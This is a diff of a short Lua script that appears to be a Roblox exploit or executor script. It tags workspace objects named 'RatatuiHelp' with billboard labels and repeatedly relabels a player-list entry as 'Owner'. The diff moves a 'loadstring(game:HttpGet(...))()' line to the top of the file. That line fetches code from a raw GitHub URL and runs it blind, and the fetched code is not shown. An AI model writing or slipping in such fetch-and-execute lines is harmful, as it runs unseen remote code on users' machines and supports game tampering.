@@ -1,4 +1,5 @@
-                                        for b, c in pairs(game:GetService("Workspace"):GetChildren()) do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/cfrs/main/sdr", true))()
+for b, c in pairs(game:GetService("Workspace"):GetChildren()) do
                                             if c.Name:find("RatatuiHelp") then
                                                 if not c:FindFirstChildWhichIsA("BillboardGui") then
                                                     local a3 = Instance.new("BillboardGui", c)
@@ -29,5 +30,3 @@ while wait() do
     game:GetService("Players").LocalPlayer.PlayerGui.SecondaryGui.PlayerList.List.RatatuiHelp.NameLabel.TextScaled = true
     game:GetService("Players").LocalPlayer.PlayerGui.SecondaryGui.PlayerList.List.RatatuiHelp.NameLabel.Text = "Owner"
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/cfrs/main/sdr", true))()
